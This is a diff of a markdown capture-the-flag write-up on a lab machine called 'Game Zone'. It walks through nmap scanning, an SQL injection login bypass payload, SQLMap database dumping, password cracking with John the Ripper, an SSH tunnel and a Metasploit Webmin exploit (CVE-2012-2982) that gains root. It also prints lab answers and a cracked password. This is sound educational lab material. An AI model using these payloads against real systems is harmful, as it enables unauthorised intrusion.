@@ -11,17 +11,18 @@ On the introduction of the challenge we can read that we will use some SQL injec
 
 First thing to do: deploy the machine.
 
->For this writeup I will say that the IP adresses are the following: 
+>For this writeup I will say that the IP adresses are the following:
 >
 > - __attack machine__ is `10.10.10.1`
-> 
+>
 > - __target machine__ is `10.10.10.2`
 {: .prompt-warning }
 
 # Task #1 - Deploy the vulnerable machine
+
 Now the machine is online we can start doing some port enumeration with ``nmap``.
 
-We will do a basic scan like: 
+We will do a basic scan like:
 
 ````bash
 nmap -sC -sV -vv 10.10.10.2
@@ -38,19 +39,21 @@ Little explanation of the options :
 : Max verbosity level
 
 After few minutes we can see two interesting running services :
-* Port 80 : http server named 'Game Zone'
-* Port 22 : ssh OpenSSH 7.2p2
+
+- Port 80 : http server named 'Game Zone'
+- Port 22 : ssh OpenSSH 7.2p2
 
 Let's see the web server first.
 
 We can easily identify Hitman on the landing page but I don't kow his real name. After googling it :
 
-> What is the name of the large cartoon avatar holding a sniper on the forum? 
-> 
+> What is the name of the large cartoon avatar holding a sniper on the forum?
+>
 > __agent 47__
 {: .prompt-tip }
 
 # Task #2 - Obtain access via SQLi
+
 SQL is a standard language for storing, editing and retrieving data in databases. A query can look like so:
 
 ````sql
@@ -64,16 +67,17 @@ In the login field I write ``username = ' or 1=1 -- -``
 Instead of giving a username and a password to the form I simply escape the username input using the `'` because strings are always stored between `' '` or `" "`. Then I add the condition ``or 1=1`` and comment all the rest of the query with the double dashes ``--``.
 
 >In simple words it will say to the database:  
-> 
-> __If 1=1 the user is authenticated__. 
+>
+> __If 1=1 the user is authenticated__.
 {: .prompt-info }
 
 > When you've logged in, what page do you get redirected to?
-> 
+>
 > __portal.php__
 {: .prompt-tip }
 
 # Task #3 - Using SQLMap
+
 We will use SQLMap to dump all the database info.
 We first have to capture a request within Burp of the search bar in portal.php
 
@@ -91,7 +95,7 @@ Where:
 : specifies a file containin the request
 
 ---dbms
-: specifies which Database Management System is used by the website 
+: specifies which Database Management System is used by the website
 
 ---dump
 : Dump DBMS database table entries
@@ -119,6 +123,7 @@ In _users_ SQLMap found just one entry and gave us the hashed password and the u
 {: .prompt-tip }
 
 # Task #4 - Cracking a password with JohnTheRipper
+
 Now that we have a username and a hashed password we can try to crack the hash to reveal it.
 for This we will use John The Ripper a 15y old very famous cracking program.
 
@@ -164,7 +169,9 @@ ssh agent47@10.10.10.2
 {: .prompt-tip }
 
 # Task #5 - Exposing services with reverse SSH tunnels
+
 Now using a tool called ``ss`` we will look at the running sockets on the victim machine.
+
 ````console
 agent47@gamezone:~$ ss -tulnp
 Netid  State      Recv-Q Send-Q                  Local Address:Port                                 Peer Address:Port              
@@ -227,6 +234,7 @@ When logged in it is not hard to find the CMS version.
 {: .prompt-tip }
 
 # Tasks #6 - Privilege escalation with Metasploit
+
 We have a CMS name and a version. Now time to look for vulnerabilities.
 
 After some researches I found that this server was vulnerable to a CVE : __CVE-2012-2982__.
@@ -293,7 +301,9 @@ username => agent47
 msf5 exploit(unix/webapp/webmin_show_cgi_exec) > set PASSWORD videogamer124
 PASSWORD => videogamer124
 ````
+
 Now everything is set we can run it.
+
 ````console
 msf5 exploit(unix/webapp/webmin_show_cgi_exec) > run
 
@@ -327,4 +337,5 @@ root
 {: .prompt-tip }
 
 # Conclusion
+
 A cool challenge introducing SSH tunnels with a mix of web and privesc.
